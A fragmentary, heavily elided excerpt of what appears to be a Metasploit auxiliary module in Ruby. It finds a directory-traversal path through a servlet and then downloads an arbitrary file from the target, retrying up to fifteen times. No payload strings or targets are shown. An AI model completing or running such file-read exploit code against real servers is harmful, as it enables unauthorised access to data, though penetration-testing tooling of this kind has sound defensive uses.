...
class MetasploitModule < Msf::Auxiliary
  ...
  def get_traversal_path
    ...
    res = send_request_cgi('uri' => normalize_uri(datastore['TARGETURI'], servlet_path),
                           'method' => 'POST',
  ...
  def download_file(download_path)
    begin
      return send_request_cgi('method' => 'GET',
  ...
  def run
    ...
    file_path = if datastore['FILEPATH'] =~ /([A-Za-z]{1}):(\\*)(.*)/
                  Regexp.last_match(3)
                else
                  datastore['FILEPATH']
                end
    ...
    if traversal_path.nil?
      ...
      while count < 15
        ...
        break if res && res.code == 200 && res.body.to_s.bytesize != 0
        count += 1
      end
    else
